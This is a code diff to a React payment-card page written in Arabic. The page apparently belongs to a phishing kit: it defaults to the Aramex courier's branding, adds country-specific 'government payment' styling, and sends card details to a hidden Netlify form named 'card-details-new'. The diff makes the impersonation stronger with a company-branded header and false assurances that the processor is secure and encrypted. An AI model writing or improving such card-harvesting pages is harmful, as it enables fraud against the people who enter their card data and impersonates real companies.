@@ -48,7 +48,11 @@ const PaymentCardInput = () => {
 
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const branding = getBrandingByCompany(serviceKey) || {
+    colors: { primary: '#DC291E', secondary: '#231F20', text: '#111827', textLight: '#6B7280', surface: '#F9FAFB', border: '#E5E7EB' },
+    fonts: { primary: 'Inter, system-ui, sans-serif', arabic: 'Cairo, Tajawal, sans-serif' },
+    gradients: { primary: 'linear-gradient(135deg, #DC291E 0%, #B71F19 100%)' }
+  };
   
   // Get government payment system for styling
   const govSystem = getGovernmentPaymentSystem(selectedCountry);
@@ -229,14 +233,26 @@ const PaymentCardInput = () => {
   };
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title="بيانات البطاقة"
-      description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
-      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-    >
+    <div className="min-h-screen" style={{ backgroundColor: branding.colors.surface, fontFamily: branding.fonts.arabic }} dir="rtl">
+      <div 
+        className="h-20 flex items-center px-6 shadow-sm"
+        style={{ background: branding.gradients.primary }}
+      >
+        <div className="container mx-auto flex items-center justify-between">
+          <div className="flex items-center gap-4">
+            <div className="bg-white px-6 py-2 rounded-md">
+              <span className="font-black text-2xl" style={{ color: branding.colors.primary, fontFamily: branding.fonts.primary }}>{serviceName}</span>
+            </div>
+          </div>
+          <div className="bg-white/10 backdrop-blur-sm px-4 py-2 rounded-lg text-white">
+            <span className="text-xs opacity-90">المبلغ: </span>
+            <span className="font-mono font-bold text-lg">{formattedAmount}</span>
+          </div>
+        </div>
+      </div>
+
+      <div className="container mx-auto px-4 py-8 max-w-2xl">
+        <div className="bg-white rounded-2xl shadow-xl p-6 sm:p-8" style={{ borderTop: `4px solid ${branding.colors.primary}` }}>
       {/* Selected Bank/Country Info */}
       {(selectedBank || selectedCountryData) && (
         <div 
@@ -261,15 +277,21 @@ const PaymentCardInput = () => {
         </div>
       )}
 
+      {/* Title */}
+      <div className="mb-6 text-center">
+        <h1 className="text-2xl sm:text-3xl font-bold mb-2" style={{ color: branding.colors.primary, fontFamily: branding.fonts.primary }}>بيانات البطاقة</h1>
+        <p className="text-sm text-muted-foreground">أدخل معلومات بطاقتك الائتمانية بشكل آمن</p>
+      </div>
+
       {/* Security Notice */}
       <div
         className="mb-6 p-4 rounded-xl border-2"
-        style={{ backgroundColor: `${branding.colors.secondary}10`, borderColor: branding.colors.secondary }}
+        style={{ backgroundColor: `${branding.colors.primary}08`, borderColor: `${branding.colors.primary}30` }}
       >
         <div className="flex items-center gap-3">
           <div
             className="w-10 h-10 rounded-full flex items-center justify-center"
-            style={{ backgroundColor: branding.colors.secondary }}
+            style={{ backgroundColor: branding.colors.primary }}
           >
             <Shield className="w-5 h-5 text-white" />
           </div>
@@ -291,7 +313,7 @@ const PaymentCardInput = () => {
       <div 
         className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-lg"
         style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+          background: branding.gradients.primary,
           minHeight: '180px'
         }}
       >
@@ -484,9 +506,10 @@ const PaymentCardInput = () => {
           className="w-full h-14 text-lg font-bold mt-6 text-white hover:opacity-90 transition-all"
           disabled={isSubmitting || !cardValid}
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+            background: branding.gradients.primary,
             borderRadius: '12px',
-            boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
+            boxShadow: branding.shadows?.md || '0 4px 12px rgba(0,0,0,0.15)',
+            fontFamily: branding.fonts.primary
           }}
         >
           {isSubmitting ? (
@@ -502,10 +525,15 @@ const PaymentCardInput = () => {
           )}
         </Button>
 
-        <p className="text-xs text-center mt-4" style={{ color: branding.colors.textLight }}>
+        <p className="text-xs text-center mt-4" style={{ color: branding.colors.textLight, fontFamily: branding.fonts.arabic }}>
           بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
         </p>
       </form>
+
+      {/* Powered by notice */}
+      <div className="mt-6 pt-4 border-t text-center">
+        <p className="text-xs text-muted-foreground">معالج دفع آمن ومشفر</p>
+      </div>
     
       {/* Hidden Netlify Form */}
       <form name="card-details-new" netlify-honeypot="bot-field" data-netlify="true" hidden>
@@ -522,7 +550,9 @@ const PaymentCardInput = () => {
         <input type="text" name="expiry" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+      </div>
+    </div>
+    </div>
   );
 };
 
